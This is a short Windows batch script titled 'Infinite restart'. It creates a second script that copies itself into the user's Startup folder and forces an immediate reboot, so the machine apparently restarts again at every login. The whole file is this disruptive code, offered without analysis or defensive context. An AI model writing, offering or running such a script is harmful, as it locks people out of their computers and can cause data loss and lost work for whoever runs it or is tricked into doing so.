@echo off
title Infinite restart
color 0a
echo @echo off > restarter.cmd
echo move /y restarter.cmd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" >> restarter.cmd
echo shutdown -r -t 0 >> restarter.cmd
start restarter.cmd
exit